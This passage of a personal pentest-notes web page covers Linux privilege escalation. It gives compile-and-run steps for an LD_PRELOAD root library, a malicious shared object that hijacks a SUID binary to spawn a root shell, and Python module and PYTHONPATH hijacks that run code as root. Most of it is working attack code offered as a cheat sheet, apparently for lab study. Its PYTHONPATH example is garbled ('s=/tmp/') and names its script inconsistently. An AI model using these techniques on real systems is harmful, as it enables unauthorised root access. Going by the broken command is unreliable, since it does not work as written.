+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Compile :</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">gcc -fPIC -shared -o root.so root.c -nostartfiles</span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Run:</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">sudo <span class="nv">LD_PRELOAD</span><span class="o">=</span>/tmp/root.so /usr/sbin/apache2 restart <span class="c1">#Apache no password root</span></span></span></code></pre></div>
+  </figure>
+</div>
+<p><strong>Shared Object Hijacking</strong>
+#Shared_Object_Hijacking</p>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"> readelf -d payroll  <span class="p">|</span> grep PATH
+</span></span><span class="line"><span class="cl"> <span class="c1">#payroll file with bit Suid</span></span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Custom LIb :</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">cp /lib/x86_64-linux-gnu/libc.so.6 /development/libshared.so
+</span></span><span class="line"><span class="cl">ldd payroll</span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Exploit :</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span><span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">dbquery</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Malicious library loaded</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">system</span><span class="p">(</span><span class="s">&#34;/bin/sh -p&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> 
+</span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Compile:</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">gcc src.c -fPIC -shared -o /development/libshared.so</span></span></code></pre></div>
+  </figure>
+</div>
+<p><strong>Python Library Hijacking</strong>
+#Python_Hijacking</p>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">pip3 show psutil <span class="c1">#misconfigure lib psutil</span></span></span></code></pre></div>
+  </figure>
+</div>
+<ul>
+<li>Exploit:</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">virtual_memory</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s1">&#39;id&#39;</span><span class="p">)</span></span></span></code></pre></div>
+  </figure>
+</div>
+<p><strong>PYTHONPATH Environment Variable</strong></p>
+<p>In the previous section, we touched upon the term <code>PYTHONPATH</code>, however, didn&rsquo;t fully explain it&rsquo;s use and importance regarding the functionality of Python. <code>PYTHONPATH</code> is an environment variable that indicates what directory (or directories) Python can search for modules to import. This is important as if a user is allowed to manipulate and set this variable while running the python binary, they can effectively redirect Python&rsquo;s search functionality to a <code>user-defined</code> location when it comes time to import modules. We can see if we have the permissions to set environment variables for the python binary by checking our <code>sudo</code> permissions:</p>
+<ul>
+<li>Checking sudo permissions</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">sudo -l 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Matching Defaults entries <span class="k">for</span> htb-student on ACADEMY-LPENIX:
+</span></span><span class="line"><span class="cl">    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">User htb-student may run the following commands on ACADEMY-LPENIX:
+</span></span><span class="line"><span class="cl">    <span class="o">(</span>ALL : ALL<span class="o">)</span> SETENV: NOPASSWD: /usr/bin/python3</span></span></code></pre></div>
+  </figure>
+</div>
+<p>As we can see from the example, we are allowed to run <code>/usr/bin/python3</code> under the trusted permissions of <code>sudo</code> and are therefore allowed to set environment variables for use with this binary by the <code>SETENV:</code> flag being set. It is important to note, that due to the trusted nature of <code>sudo</code>, any environment variables defined prior to calling the binary are not subject to any restrictions regarding being able to set environment variables on the system. This means that using the <code>/usr/bin/python3</code> binary, we can effectively set any environment variables under the context of our running program. Let&rsquo;s try to do so now using the <code>psutil.py</code> script from the last section.</p>
+<ul>
+<li>Privilege Escalation using PYTHONPATH Environment Variable</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="nv">s</span><span class="o">=</span>/tmp/ /usr/bin/python3 ./mem_status.py
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+</span></span><span class="line"><span class="cl">...SNIP...</span></span></code></pre></div>
+  </figure>
+</div>
+<p>In this example, we moved the previous python script from the <code>/usr/lib/python3.8</code> directory to <code>/tmp</code>. From here we once again call <code>/usr/bin/python3</code> to run <code>mem_stats.py</code>, however, we specify that the <code>PYTHONPATH</code> variable contain the <code>/tmp</code> directory so that it forces Python to search that directory looking for the <code>psutil</code> module to import. As we can see, we once again have successfully run our script under the context of root.</p>
+<ul>
+<li>Other way to privesc:</li>
+</ul>
+
+
+
+<div class="expressive-code">
+  <figure class="frame is-terminal not-content">
+  <figcaption class="header">
+    <span class="title"></span>
+  </figcaption>
+  <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">grep -r <span class="s2">&#34;def virtual_memory&#34;</span> /usr/local/lib/python3.8/dist-packages/psutil/*</span></span></code></pre></div>
+  </figure>
+</div>
+<h3 id="resources">Resources<a href="#resources" class="anchor" aria-hidden="true">#</a> </h3>
+<ul>
+<li>Tools :
+<strong>https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh</strong></li>
+</ul>
+
+			<div class="page-footer-meta d-flex flex-column flex-md-row justify-content-between">
+				</div>
+			<div class="page-nav d-flex flex-column flex-sm-row">
+	
+	<div class="card w-100">
+			<div class="card-body d-flex">
+				<div class="d-flex flex-column justify-content-center">
+					<svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-arrow-left" width="20" height="20" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+						<path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+						<path d="M5 12l14 0"></path>
+						<path d="M5 12l6 6"></path>
+						<path d="M5 12l6 -6"></path>
+				 	</svg>
+				</div>
+				<div class="d-flex flex-column">
+					<div class="text-body-secondary">Prev</div>
+					<a href="/notes/ad/linux/" class="stretched-link text-reset text-decoration-none">Linux</a>
+				</div>
+			</div>
+		</div>
+	<div class="m-2"></div>
+	<div class="card text-end w-100">
+			<div class="card-body d-flex justify-content-end">
+				<div class="d-flex flex-column">
+					<div class="text-body-secondary">Next</div>
+					<a href="/notes/lab/vulnlab/lock/" class="stretched-link text-reset text-decoration-none">Lock</a>
+				</div>
+				<div class="d-flex flex-column justify-content-center">
+					<svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-arrow-right" width="20" height="20" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+						<path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
+						<path d="M5 12l14 0"></path>
+						<path d="M13 18l6 -6"></path>
+						<path d="M13 6l6 6"></path>
+					</svg>
+				</div>
+			</div>
+		</div>
+	</div>
+
+			
+		</main>
+		
+	</div>
+
+      
+      </div>
+    </div>
+    
+    
+    <footer class="footer text-muted">
+  <div class="container-lg">
+    <div class="row">
+      <div class="col-lg-8 text-center text-lg-start">
+        <ul class="list-inline">
+          <li class="list-inline-item"><a class="text-muted" href="/privacy/">Privacy Policy</a></li>
+        </ul>
+      </div>
+      <div class="col-lg-8 text-center text-lg-end">
+        <ul class="list-inline">
+          <li class="list-inline-item">Brought to you by <a class="text-muted" href="https://thulite.io/">Thulite</a></li>
+        </ul>
+      </div>
+    </div>
+  </div>
+</footer>
+
+    
+
+<script async
+  src="/js/app.249127ac97fccea7237e5990340629c63da5a555a7c4a120cf11a5113ea5e96e.js"
+  integrity="sha256-JJEnrJf8zqcjflmQNAYpxj2lpVWnxKEgzxGlET6l6W4=">
+</script>
+
+
+
+
+
+<script async
+  src="/js/flexsearch.be33aab3067e96554f261851c25a593228b91154cd28ff5c7f8d52b2e7f306d2.js"
+  integrity="sha256-vjOqswZ&#43;llVPJhhRwlpZMii5EVTNKP9cf41SsufzBtI=">
+</script>
+<script async
+  src="/js/search-modal.97d606e77f08deeb37876860d99c8f6813ef29263e73b6435c252de6be98d55e.js"
+  integrity="sha256-l9YG538I3us3h2hg2ZyPaBPvKSY&#43;c7ZDXCUt5r6Y1V4=">
+</script>
+
+    
+  </body>
+</html>
